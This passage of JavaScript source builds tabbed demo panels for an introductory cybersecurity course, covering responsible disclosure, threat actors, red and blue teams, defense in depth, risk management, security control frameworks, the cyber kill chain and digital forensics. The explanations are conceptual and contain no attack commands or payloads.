            process: 'RESPONSIBLE DISCLOSURE PROCESS:\n\n┌─────────────────────────────────────┐\n│ 1. DISCOVER VULNERABILITY           │\n│    Document thoroughly              │\n│    Create proof of concept          │\n│    DO NOT exploit beyond necessary  │\n├─────────────────────────────────────┤\n│ 2. NOTIFY VENDOR PRIVATELY          │\n│    Find security contact            │\n│    (security@, HackerOne, etc.)     │\n│    Use encrypted communication      │\n├─────────────────────────────────────┤\n│ 3. COLLABORATE ON FIX               │\n│    Provide technical details        │\n│    Answer vendor questions          │\n│    Verify patch effectiveness       │\n├─────────────────────────────────────┤\n│ 4. COORDINATE PUBLIC DISCLOSURE     │\n│    Agree on timeline                │\n│    Publish after patch released     │\n│    Credit and recognition           │\n└─────────────────────────────────────┘',
            timeline: 'DISCLOSURE TIMELINE:\n\nStandard: 90 days (Google Project Zero)\n\nDay 0: ─── Vulnerability Discovered ───\n       │\nDay 1: ─── Report Sent to Vendor ───\n       │   Include: Description, PoC,\n       │   Impact assessment, CVE request\n       │\nDay 7: ─── Vendor Acknowledgment ───\n       │   If no response, try alternate channels\n       │\nDay 30: ── Status Update Request ───\n       │\nDay 60: ── Progress Check ───\n       │   Negotiate extension if needed\n       │\nDay 90: ── PUBLIC DISCLOSURE ───\n       │   Patch should be available\n       │   Publish advisory\n\n⚠️ ZERO DAY EXCEPTION:\n   If actively exploited in wild,\n   shorter timeline may be appropriate',
            bugbounty: 'BUG BOUNTY PROGRAMS:\n\n┌─────────────────────────────────────┐\n│ MAJOR PLATFORMS                     │\n├─────────────────────────────────────┤\n│ HackerOne    │ Largest platform     │\n│ Bugcrowd     │ Enterprise focus     │\n│ Synack       │ Vetted researchers   │\n│ Intigriti    │ European leader      │\n│ YesWeHack    │ EU-based platform    │\n└─────────────────────────────────────┘\n\nTYPICAL BOUNTY RANGES:\n  Low severity:    $100 - $500\n  Medium:          $500 - $2,000\n  High:            $2,000 - $10,000\n  Critical:        $10,000 - $100,000+\n\nTOP PAYOUTS:\n  • Apple: $2 million (iOS kernel)\n  • Google: $605,000 (Android chain)\n  • Microsoft: $200,000 (Hyper-V escape)\n\n✅ BENEFITS:\n   Legal safe harbor\n   Clear rules of engagement\n   Financial reward\n   Recognition (Hall of Fame)'
        };
        $('#discloseOut').textContent = data.process;
        $$('#discloseTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#discloseTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#discloseOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 13: security-fund-intro - Security Fundamentals Intro
    function demoSecurityFundIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">FUNDAMENTALS</span><span class="demo-title">Security Fundamentals Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fundIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="cia">CIA Triad</button>
                <button class="demo-btn demo-btn-sm" data-t="threats">Threat Landscape</button>
                <button class="demo-btn demo-btn-sm" data-t="actors">Threat Actors</button>
            </div>
            <div id="fundIntroOut" style="background:#263238;color:#80cbc4;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            cia: 'CIA TRIAD - FOUNDATION OF SECURITY:\n\n         ┌───────────────┐\n         │CONFIDENTIALITY│\n         │   🔒 Secret   │\n         └───────┬───────┘\n                 │\n    ┌────────────┼────────────┐\n    │            │            │\n┌───▼────┐  ┌────▼────┐  ┌────▼───┐\n│INTEGRITY│  │  CIA   │  │AVAILA- │\n│🔐 Trust │  │ TRIAD  │  │BILITY  │\n└─────────┘  └─────────┘  │🌐 Access│\n                         └─────────┘\n\nCONFIDENTIALITY:\n  Only authorized access to information\n\nINTEGRITY:\n  Data is accurate and unaltered\n\nAVAILABILITY:\n  Systems accessible when needed\n\n+ Authentication, Non-repudiation',
            threats: 'MODERN THREAT LANDSCAPE:\n\n┌─────────────────────────────────────┐\n│ MALWARE                             │\n│ • Ransomware (WannaCry, REvil)      │\n│ • Trojans, RATs                     │\n│ • Cryptominers                      │\n├─────────────────────────────────────┤\n│ SOCIAL ENGINEERING                  │\n│ • Phishing (email, SMS, voice)      │\n│ • Business Email Compromise         │\n│ • Pretexting, baiting               │\n├─────────────────────────────────────┤\n│ WEB ATTACKS                         │\n│ • SQL Injection                     │\n│ • Cross-Site Scripting (XSS)        │\n│ • API vulnerabilities               │\n├─────────────────────────────────────┤\n│ INFRASTRUCTURE                      │\n│ • DDoS attacks                      │\n│ • Supply chain compromises          │\n│ • Cloud misconfigurations           │\n└─────────────────────────────────────┘',
            actors: 'THREAT ACTORS:\n\n👤 SCRIPT KIDDIES:\n   Low skill, use existing tools\n   Motivation: Fun, bragging rights\n   Impact: Usually low\n\n💰 CYBERCRIMINALS:\n   Organized groups, profit-motivated\n   Ransomware, fraud, data theft\n   Impact: High (billions $ annually)\n\n🏛️ NATION-STATE (APT):\n   Government-backed hackers\n   Espionage, sabotage, influence ops\n   Examples: APT28, APT41, Lazarus Group\n   Impact: Critical infrastructure\n\n👔 INSIDERS:\n   Employees, contractors with access\n   Intentional or accidental\n   Hardest to detect\n\n🎭 HACKTIVISTS:\n   Political/ideological motivation\n   DDoS, defacement, data leaks\n   Examples: Anonymous'
        };
        $('#fundIntroOut').textContent = data.cia;
        $$('#fundIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#fundIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#fundIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 14: red-vs-blue-team - Red Team vs Blue Team
    function demoRedVsBlueTeam(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">TEAMS</span><span class="demo-title">Red Team vs Blue Team</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="teamsTabs">
                <button class="demo-btn demo-btn-sm active" data-t="red">Red Team</button>
                <button class="demo-btn demo-btn-sm" data-t="blue">Blue Team</button>
                <button class="demo-btn demo-btn-sm" data-t="purple">Purple Team</button>
            </div>
            <div id="teamsOut" style="background:#263238;color:#ef9a9a;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            red: 'RED TEAM (Offensive Security):\n\n🔴 MISSION: Think like an attacker\n\nACTIVITIES:\n  • Penetration testing\n  • Social engineering\n  • Physical security testing\n  • Red team exercises\n  • Vulnerability research\n\nTOOLS:\n  • Metasploit, Cobalt Strike\n  • Burp Suite, Nmap\n  • Custom exploits\n  • Social engineering toolkit\n\nSKILLS NEEDED:\n  ✓ Programming (Python, C)\n  ✓ Networking deep knowledge\n  ✓ OS internals (Windows, Linux)\n  ✓ Web application security\n  ✓ Creative problem solving\n\nCERTIFICATIONS:\n  OSCP, OSCE, GPEN, CEH',
            blue: 'BLUE TEAM (Defensive Security):\n\n🔵 MISSION: Protect and defend\n\nACTIVITIES:\n  • Security monitoring (SOC)\n  • Incident response\n  • Threat hunting\n  • Security architecture\n  • Compliance & audit\n\nTOOLS:\n  • SIEM (Splunk, ELK)\n  • EDR (CrowdStrike, Carbon Black)\n  • Firewalls, IDS/IPS\n  • Vulnerability scanners\n\nSKILLS NEEDED:\n  ✓ Log analysis\n  ✓ Network traffic analysis\n  ✓ Malware analysis basics\n  ✓ Incident handling\n  ✓ Documentation & communication\n\nCERTIFICATIONS:\n  GCIH, GCIA, Security+, CySA+',
            purple: 'PURPLE TEAM (Collaboration):\n\n🟣 MISSION: Bridge red and blue\n\n┌─────────────────────────────────────┐\n│    RED         PURPLE        BLUE   │\n│   TEAM  ◀────▶ TEAM  ◀────▶  TEAM   │\n│  Attack        Learn        Defend  │\n│              Together               │\n└─────────────────────────────────────┘\n\nBENEFITS:\n  ✓ Immediate feedback loop\n  ✓ Better detection rules\n  ✓ Improved defenses\n  ✓ Knowledge transfer\n  ✓ Realistic training\n\nPURPLE TEAM EXERCISE:\n  1. Red attacks specific technique\n  2. Blue attempts to detect\n  3. Discuss detection gaps\n  4. Improve detection rules\n  5. Red tests again\n  6. Repeat until detected\n\nOUTCOME: Stronger overall security'
        };
        $('#teamsOut').textContent = data.red;
        $$('#teamsTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#teamsTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#teamsOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 15: defense-in-depth - Defense in Depth
    function demoDefenseInDepth(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">STRATEGY</span><span class="demo-title">Defense in Depth</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="didTabs">
                <button class="demo-btn demo-btn-sm active" data-t="concept">The Concept</button>
                <button class="demo-btn demo-btn-sm" data-t="layers">Security Layers</button>
                <button class="demo-btn demo-btn-sm" data-t="example">Example</button>
            </div>
            <div id="didOut" style="background:#263238;color:#b39ddb;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            concept: 'DEFENSE IN DEPTH:\n\nMilitary strategy applied to cybersecurity\n\n"Multiple layers of security so that\n if one fails, others still protect"\n\n     ┌────────────────────────────┐\n     │         ATTACKER           │\n     └──────────────┬─────────────┘\n                    ↓\n     ╔════════════════════════════╗\n     ║     Perimeter Security     ║ ← Layer 1\n     ╚════════════════════════════╝\n                    ↓\n     ╔════════════════════════════╗\n     ║     Network Security       ║ ← Layer 2\n     ╚════════════════════════════╝\n                    ↓\n     ╔════════════════════════════╗\n     ║     Host Security          ║ ← Layer 3\n     ╚════════════════════════════╝\n                    ↓\n     ╔════════════════════════════╗\n     ║     Application Security   ║ ← Layer 4\n     ╚════════════════════════════╝\n                    ↓\n              🔒 DATA 🔒',
            layers: 'SECURITY LAYERS:\n\n┌─────────────────────────────────────┐\n│ PHYSICAL                            │\n│ • Guards, locks, cameras            │\n│ • Biometric access                  │\n├─────────────────────────────────────┤\n│ PERIMETER                           │\n│ • Firewalls, DMZ                    │\n│ • VPN, WAF                          │\n├─────────────────────────────────────┤\n│ NETWORK                             │\n│ • Segmentation, VLANs               │\n│ • IDS/IPS, monitoring               │\n├─────────────────────────────────────┤\n│ HOST                                │\n│ • EDR, antivirus                    │\n│ • Hardening, patching               │\n├─────────────────────────────────────┤\n│ APPLICATION                         │\n│ • Secure coding, WAF                │\n│ • Input validation                  │\n├─────────────────────────────────────┤\n│ DATA                                │\n│ • Encryption at rest/transit        │\n│ • DLP, access controls              │\n└─────────────────────────────────────┘',
            example: 'REAL-WORLD EXAMPLE:\n\nProtecting a web application:\n\nLAYER 1 - PERIMETER:\n  ✓ WAF (Web Application Firewall)\n  ✓ DDoS protection (Cloudflare)\n  ✓ Rate limiting\n\nLAYER 2 - NETWORK:\n  ✓ Network segmentation\n  ✓ Internal firewall rules\n  ✓ IDS monitoring traffic\n\nLAYER 3 - HOST:\n  ✓ Hardened Linux server\n  ✓ SELinux enabled\n  ✓ EDR agent installed\n\nLAYER 4 - APPLICATION:\n  ✓ Input validation\n  ✓ Parameterized queries\n  ✓ CSP headers\n  ✓ Authentication (MFA)\n\nLAYER 5 - DATA:\n  ✓ Encrypted database\n  ✓ Secrets in vault\n  ✓ Backup encryption\n\n→ Attacker must bypass ALL layers!'
        };
        $('#didOut').textContent = data.concept;
        $$('#didTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#didTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#didOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 16: risk-management - Risk Management
    function demoRiskManagement(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">MANAGEMENT</span><span class="demo-title">Risk Management</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="riskTabs">
                <button class="demo-btn demo-btn-sm active" data-t="formula">Risk Formula</button>
                <button class="demo-btn demo-btn-sm" data-t="response">Risk Response</button>
                <button class="demo-btn demo-btn-sm" data-t="matrix">Risk Matrix</button>
            </div>
            <div id="riskOut" style="background:#263238;color:#fff59d;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            formula: 'RISK CALCULATION:\n\n┌─────────────────────────────────────┐\n│  RISK = THREAT × VULNERABILITY ×    │\n│                  IMPACT             │\n└─────────────────────────────────────┘\n\nCOMPONENTS:\n\nTHREAT: Who/what could attack?\n  • External hackers\n  • Insiders\n  • Natural disasters\n\nVULNERABILITY: What weaknesses exist?\n  • Unpatched systems\n  • Weak passwords\n  • Misconfiguration\n\nIMPACT: What\'s the damage if exploited?\n  • Financial loss\n  • Reputation damage\n  • Legal penalties\n\nEXAMPLE:\n  SQL Injection vulnerability:\n  Threat: 8/10 (common attack)\n  Vuln: 9/10 (no input validation)\n  Impact: 9/10 (database breach)\n  RISK = 8 × 9 × 9 = 648 (CRITICAL)',
            response: 'RISK RESPONSE STRATEGIES:\n\n┌─────────────────────────────────────┐\n│ AVOID                               │\n│ Eliminate the risk entirely         │\n│ Ex: Don\'t store sensitive data      │\n├─────────────────────────────────────┤\n│ MITIGATE                            │\n│ Reduce likelihood or impact         │\n│ Ex: Implement encryption, patching  │\n├─────────────────────────────────────┤\n│ TRANSFER                            │\n│ Shift risk to third party           │\n│ Ex: Cyber insurance, outsourcing    │\n├─────────────────────────────────────┤\n│ ACCEPT                              │\n│ Acknowledge and budget for it       │\n│ Ex: Low-impact risks, cost > fix    │\n└─────────────────────────────────────┘\n\n⚠️ RESIDUAL RISK:\n   Risk remaining after controls applied\n   Some risk always remains!',
            matrix: 'RISK ASSESSMENT MATRIX:\n\n         IMPACT\n         Low    Med    High   Crit\n      ┌──────┬──────┬──────┬──────┐\nHigh  │ MED  │ HIGH │ CRIT │ CRIT │\nLIKE- ├──────┼──────┼──────┼──────┤\nLI-   │ LOW  │ MED  │ HIGH │ CRIT │\nHOOD  ├──────┼──────┼──────┼──────┤\nMed   │ LOW  │ LOW  │ MED  │ HIGH │\n      ├──────┼──────┼──────┼──────┤\nLow   │ LOW  │ LOW  │ LOW  │ MED  │\n      └──────┴──────┴──────┴──────┘\n\nRISK RATINGS:\n  🔴 CRITICAL: Immediate action required\n  🟠 HIGH: Urgent attention needed\n  🟡 MEDIUM: Plan remediation\n  🟢 LOW: Monitor and review\n\nDocument ALL risks in a Risk Register!'
        };
        $('#riskOut').textContent = data.formula;
        $$('#riskTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#riskTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#riskOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 17: critical-security-controls - Critical Security Controls
    function demoCriticalSecurityControls(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">CONTROLS</span><span class="demo-title">Critical Security Controls</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="cscTabs">
                <button class="demo-btn demo-btn-sm active" data-t="cis">CIS Controls</button>
                <button class="demo-btn demo-btn-sm" data-t="nist">NIST Framework</button>
                <button class="demo-btn demo-btn-sm" data-t="priority">Priority</button>
            </div>
            <div id="cscOut" style="background:#263238;color:#c5e1a5;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            cis: 'CIS CRITICAL SECURITY CONTROLS v8:\n\n┌─────────────────────────────────────┐\n│ BASIC CONTROLS (1-6)                │\n├─────────────────────────────────────┤\n│ 1. Inventory & Control of Assets    │\n│ 2. Inventory of Software Assets     │\n│ 3. Data Protection                  │\n│ 4. Secure Config of Assets          │\n│ 5. Account Management               │\n│ 6. Access Control Management        │\n├─────────────────────────────────────┤\n│ FOUNDATIONAL CONTROLS (7-12)        │\n├─────────────────────────────────────┤\n│ 7. Continuous Vuln Management       │\n│ 8. Audit Log Management             │\n│ 9. Email & Browser Protections      │\n│ 10. Malware Defenses                │\n│ 11. Data Recovery                   │\n│ 12. Network Infrastructure Mgmt     │\n└─────────────────────────────────────┘\n\n→ Implement in order for maximum impact!',
            nist: 'NIST CYBERSECURITY FRAMEWORK:\n\n5 Core Functions:\n\n┌─────────────────────────────────────┐\n│ IDENTIFY                            │\n│ Asset management, risk assessment   │\n│ Governance, business environment    │\n├─────────────────────────────────────┤\n│ PROTECT                             │\n│ Access control, training            │\n│ Data security, maintenance          │\n├─────────────────────────────────────┤\n│ DETECT                              │\n│ Anomaly detection, monitoring       │\n│ Continuous security monitoring      │\n├─────────────────────────────────────┤\n│ RESPOND                             │\n│ Response planning, communications   │\n│ Analysis, mitigation, improvements  │\n├─────────────────────────────────────┤\n│ RECOVER                             │\n│ Recovery planning, improvements     │\n│ Communications                      │\n└─────────────────────────────────────┘',
            priority: 'IMPLEMENTATION PRIORITY:\n\nQUICK WINS (Week 1):\n  ✓ Enable MFA everywhere\n  ✓ Disable unused accounts\n  ✓ Update critical systems\n  ✓ Enable logging\n\nSHORT TERM (Month 1):\n  ✓ Asset inventory\n  ✓ Vulnerability scanning\n  ✓ Security awareness training\n  ✓ Backup verification\n\nMEDIUM TERM (Quarter 1):\n  ✓ Network segmentation\n  ✓ EDR deployment\n  ✓ Incident response plan\n  ✓ Privileged access mgmt\n\nLONG TERM (Year 1):\n  ✓ Zero Trust architecture\n  ✓ Threat intelligence program\n  ✓ Security automation\n  ✓ Continuous improvement\n\n📊 80% of breaches prevented by\n   implementing first 6 CIS controls!'
        };
        $('#cscOut').textContent = data.cis;
        $$('#cscTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cscTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cscOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 18: stages-of-attack - Stages of Attack (Cyber Kill Chain)
    function demoStagesOfAttack(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">ATTACK</span><span class="demo-title">Stages of Attack - Cyber Kill Chain</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="killChainTabs">
                <button class="demo-btn demo-btn-sm active" data-t="stages">7 Stages</button>
                <button class="demo-btn demo-btn-sm" data-t="mitre">MITRE ATT&CK</button>
                <button class="demo-btn demo-btn-sm" data-t="detect">Detection</button>
            </div>
            <div id="killChainOut" style="background:#263238;color:#ff8a80;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            stages: 'LOCKHEED MARTIN CYBER KILL CHAIN:\n\n1. RECONNAISSANCE\n   └─ Gather information about target\n\n2. WEAPONIZATION\n   └─ Create malware/exploit payload\n\n3. DELIVERY\n   └─ Send payload (email, web, USB)\n\n4. EXPLOITATION\n   └─ Trigger vulnerability\n\n5. INSTALLATION\n   └─ Install backdoor/RAT\n\n6. COMMAND & CONTROL (C2)\n   └─ Establish remote access\n\n7. ACTIONS ON OBJECTIVES\n   └─ Achieve goal (steal data, ransomware)\n\n┌─────────────────────────────────────┐\n│ ⚠️ DEFENSE: Break ANY link in the  │\n│    chain to stop the attack!       │\n└─────────────────────────────────────┘',
            mitre: 'MITRE ATT&CK FRAMEWORK:\n\nMore detailed than Kill Chain\n14 Tactics, 200+ Techniques\n\nTACTICS (What attacker wants):\n┌─────────────────────────────────────┐\n│ • Reconnaissance                    │\n│ • Resource Development              │\n│ • Initial Access                    │\n│ • Execution                         │\n│ • Persistence                       │\n│ • Privilege Escalation              │\n│ • Defense Evasion                   │\n│ • Credential Access                 │\n│ • Discovery                         │\n│ • Lateral Movement                  │\n│ • Collection                        │\n│ • Command and Control               │\n│ • Exfiltration                      │\n│ • Impact                            │\n└─────────────────────────────────────┘\n\nUse: attack.mitre.org for full matrix',
            detect: 'DETECTION AT EACH STAGE:\n\n1. RECON → Monitor for scanning\n   • IDS alerts, honeypots\n   • Web server logs analysis\n\n2. DELIVERY → Email/web filtering\n   • Sandbox analysis\n   • URL reputation\n\n3. EXPLOITATION → Patch management\n   • EDR behavioral detection\n   • Memory protection\n\n4. INSTALLATION → AV/EDR\n   • File integrity monitoring\n   • Behavior analysis\n\n5. C2 → Network monitoring\n   • DNS anomaly detection\n   • Beacon traffic analysis\n\n6. LATERAL → Segmentation\n   • East-west traffic monitoring\n   • Identity analytics\n\n7. EXFIL → DLP\n   • Egress filtering\n   • Data classification\n\n🎯 Goal: Detect as early as possible!'
        };
        $('#killChainOut').textContent = data.stages;
        $$('#killChainTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#killChainTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#killChainOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 31: forensics-intro - Introduction to Digital Forensics
    function demoForensicsIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">FORENSICS</span><span class="demo-title">Introduction to Digital Forensics</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="forIntroTabs">
                <button class="demo-btn demo-btn-sm active" data-t="what">What is Forensics?</button>
                <button class="demo-btn demo-btn-sm" data-t="types">Types</button>
                <button class="demo-btn demo-btn-sm" data-t="careers">Careers</button>
            </div>
            <div id="forIntroOut" style="background:#1a1a2e;color:#ffa500;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS DIGITAL FORENSICS?\n\nThe process of identifying, preserving,\nanalyzing, and presenting digital evidence\nfor legal proceedings or investigations.\n\n┌─────────────────────────────────────┐\n│ DIGITAL FORENSICS =                 │\n│ Scientific investigation of         │\n│ digital devices and data            │\n└─────────────────────────────────────┘\n\nGOALS:\n  🔍 Determine WHAT happened\n  ⏰ Establish WHEN it happened\n  👤 Identify WHO was involved\n  📍 Discover WHERE it occurred\n  ❓ Understand HOW it happened\n  💡 Determine WHY (motive)\n\nKEY PRINCIPLE:\n  Evidence must be legally admissible\n  Maintain chain of custody!',
            types: 'TYPES OF DIGITAL FORENSICS:\n\n┌─────────────────────────────────────┐\n│ COMPUTER FORENSICS                  │\n│ • Disk analysis                     │\n│ • File recovery                     │\n│ • Operating system artifacts        │\n├─────────────────────────────────────┤\n│ MEMORY FORENSICS                    │\n│ • RAM analysis                      │\n│ • Running processes                 │\n│ • Network connections               │\n├─────────────────────────────────────┤\n│ NETWORK FORENSICS                   │\n│ • Packet capture analysis           │\n│ • Traffic patterns                  │\n│ • Intrusion detection               │\n├─────────────────────────────────────┤\n│ MOBILE FORENSICS                    │\n│ • Smartphone data extraction        │\n│ • App analysis                      │\n│ • Location data                     │\n├─────────────────────────────────────┤\n│ CLOUD FORENSICS                     │\n│ • Cloud service logs                │\n│ • Virtualized environments          │\n│ • Multi-tenant challenges           │\n└─────────────────────────────────────┘',
            careers: 'CAREERS IN DIGITAL FORENSICS:\n\n👔 JOB TITLES:\n  • Digital Forensic Analyst\n  • Incident Response Specialist\n  • Malware Analyst\n  • Computer Crime Investigator\n  • eDiscovery Specialist\n\n🏢 EMPLOYERS:\n  • Law enforcement (FBI, Secret Service)\n  • Corporate security teams\n  • Consulting firms\n  • Legal/eDiscovery firms\n  • Government agencies\n\n📜 CERTIFICATIONS:\n  • EnCE (EnCase Certified Examiner)\n  • ACE (AccessData Certified Examiner)\n  • GCFE (GIAC Forensic Examiner)\n  • GCFA (Advanced Forensic Analyst)\n  • CHFI (Computer Hacking Forensic Inv.)\n  • CCE (Certified Computer Examiner)\n\n💰 SALARY RANGE:\n  Entry: $60,000 - $80,000\n  Mid:   $80,000 - $110,000\n  Senior: $110,000 - $150,000+'
        };
        $('#forIntroOut').textContent = data.what;
        $$('#forIntroTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#forIntroTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#forIntroOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 32: forensic-process - The Forensic Process
    function demoForensicProcess(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">PROCESS</span><span class="demo-title">The Forensic Process</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="forProcessTabs">
                <button class="demo-btn demo-btn-sm active" data-t="steps">5 Steps</button>
                <button class="demo-btn demo-btn-sm" data-t="coc">Chain of Custody</button>
                <button class="demo-btn demo-btn-sm" data-t="report">Reporting</button>
            </div>
            <div id="forProcessOut" style="background:#1a1a2e;color:#81d4fa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            steps: 'FORENSIC INVESTIGATION PROCESS:\n\n1️⃣ IDENTIFICATION\n   • Identify evidence sources\n   • Document the scene\n   • Determine scope\n\n2️⃣ PRESERVATION\n   • Create forensic images\n   • Calculate hash values\n   • Document chain of custody\n   • NEVER work on original!\n\n3️⃣ ANALYSIS\n   • Examine file systems\n   • Recover deleted files\n   • Build timelines\n   • Analyze artifacts\n\n4️⃣ DOCUMENTATION\n   • Detailed notes throughout\n   • Screenshots & recordings\n   • Tool outputs preserved\n\n5️⃣ PRESENTATION\n   • Expert witness testimony\n   • Technical reports\n   • Non-technical summaries',
            coc: 'CHAIN OF CUSTODY:\n\nDocuments who handled evidence and when.\n\n┌─────────────────────────────────────┐\n│        EVIDENCE CUSTODY LOG         │\n├─────────────────────────────────────┤\n│ Case: 2024-IR-0042                  │\n│ Item: Dell Latitude (SN: ABC12345)  │\n│ Evidence #: E001                    │\n├─────────────────────────────────────┤\n│ Date/Time   │ Person    │ Action    │\n├─────────────┼───────────┼───────────┤\n│ 03/15 09:00 │ J.Smith   │ Seized    │\n│ 03/15 10:30 │ J.Smith   │ Transport │\n│ 03/15 11:00 │ A.Johnson │ Received  │\n│ 03/15 14:00 │ A.Johnson │ Imaged    │\n│ 03/16 09:00 │ M.Lee     │ Analysis  │\n└─────────────┴───────────┴───────────┘\n\n⚠️ ANY GAP = Evidence may be inadmissible',
            report: 'FORENSIC REPORT STRUCTURE:\n\n┌─────────────────────────────────────┐\n│ 1. EXECUTIVE SUMMARY                │\n│    Non-technical overview           │\n│    Key findings                     │\n├─────────────────────────────────────┤\n│ 2. CASE INFORMATION                 │\n│    Case number, parties involved    │\n│    Scope of investigation           │\n├─────────────────────────────────────┤\n│ 3. EVIDENCE SUMMARY                 │\n│    List of items examined           │\n│    Chain of custody references      │\n├─────────────────────────────────────┤\n│ 4. METHODOLOGY                      │\n│    Tools used                       │\n│    Procedures followed              │\n├─────────────────────────────────────┤\n│ 5. FINDINGS                         │\n│    Detailed technical analysis      │\n│    Timeline of events               │\n├─────────────────────────────────────┤\n│ 6. CONCLUSIONS                      │\n│    Expert opinions                  │\n│    Recommendations                  │\n├─────────────────────────────────────┤\n│ 7. APPENDICES                       │\n│    Tool outputs, hash values        │\n└─────────────────────────────────────┘'
        };
        $('#forProcessOut').textContent = data.steps;
        $$('#forProcessTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#forProcessTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#forProcessOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C9 Lesson 33: legal-considerations - Legal Considerations in Forensics
    function demoLegalConsiderations(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">LEGAL</span><span class="demo-title">Legal Considerations</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="legalTabs">
                <button class="demo-btn demo-btn-sm active" data-t="admiss">Admissibility</button>
                <button class="demo-btn demo-btn-sm" data-t="warrant">Warrants</button>
                <button class="demo-btn demo-btn-sm" data-t="testimony">Testimony</button>
            </div>
            <div id="legalOut" style="background:#1a1a2e;color:#ef5350;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
